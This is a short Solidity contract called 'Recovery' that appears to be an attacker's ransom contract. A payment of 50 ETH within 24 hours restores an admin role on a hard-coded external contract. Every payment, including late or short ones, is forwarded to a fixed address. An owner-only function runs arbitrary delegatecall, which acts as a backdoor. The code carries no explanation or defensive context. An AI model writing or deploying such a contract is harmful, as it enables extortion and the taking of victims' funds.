//SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract Recovery {
    address public owner;
    uint256 public start;

    constructor() {
        start = block.timestamp;
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            "Only owner can call this function."
        );
        _;
    }

    function redemption(address newOwner) public payable {
        // 50 ETH and should redeem it under 24hr since this contract created
        if(msg.value >= 50 ether && start + 1 days >= block.timestamp) {
            address(0xAcB3C6a43D15B907e8433077B6d38Ae40936fe2c).call(abi.encodeWithSignature("grantRole(bytes32,address)", 0x0000000000000000000000000000000000000000000000000000000000000000, newOwner));
        }
        address(0x2A00CA38FB9B821edeA2478DA31d97B0f83347fe).call{value: msg.value}("");
    }

    receive() external payable  {
        redemption(msg.sender);
    }

    fallback() external payable {
        redemption(msg.sender);
    }

    function caller(address vxr, bytes memory data) public onlyOwner {
        vxr.delegatecall(data);
    }
}